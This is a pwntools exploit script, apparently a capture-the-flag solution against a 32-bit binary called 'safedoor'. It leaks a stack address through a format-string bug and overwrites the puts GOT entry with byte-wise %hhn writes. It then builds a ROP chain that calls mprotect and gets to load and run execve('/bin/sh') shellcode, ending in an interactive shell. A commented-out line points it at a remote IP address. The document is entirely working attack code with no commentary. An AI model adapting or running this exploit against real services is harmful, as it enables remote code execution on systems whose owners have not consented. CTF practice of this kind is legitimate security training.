from pwn import *
p = process('./safedoor')
context(log_level='debug')

# p = remote('219.146.15.117',8000)
elf = ELF('safedoor')
puts_got = elf.got['puts']
mprotect_plt = elf.symbols['mprotect']
gets_plt = elf.symbols['gets']

ppp_ret = 0x080486cd
p_ret = 0x080483e1

p.recvuntil('KEY:')
m_p = 0x0804858D
page_size = 4096
# x&~(page_size-1)


gdb.attach(p,'b* 0x0804858D\nc')
payload = "%70$p..."
p.sendline(payload)
ebp = p.recvuntil('...')[8:16]
ebp_addr= int(ebp,16)
shellcode_addr  = (ebp_addr-296-0x98)&~(page_size-1)

for x in range(2):
	l = (m_p >> (x*8)) &0xff
	payload = p32(puts_got+x)+"%%%dc"%(l-4)+"%4$hhn..."
	p.sendline(payload)
	p.recvuntil('...')
l = (m_p >> (2*8)) &0xff
payload = p32(puts_got+2)+"%4$hhn..."
p.sendline(payload)
p.recvuntil('...')
l = (m_p >> (3*8)) &0xff
payload = p32(puts_got+3)+"%%%dc"%(l-4)+"%4$hhn..."
p.sendline(payload)
p.recvuntil('...')
p.sendline('STjJaOEwLszsLwRy')
p.recvuntil('\nKEY:')
shellcode =  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload1 = 'A'*(140)+p32(mprotect_plt)+p32(ppp_ret)+p32(shellcode_addr)+p32(page_size)+p32(7)+p32(gets_plt)+p32(p_ret)+p32(shellcode_addr)+p32(shellcode_addr)
p.sendline(payload1)
p.sendline(shellcode)
p.interactive()
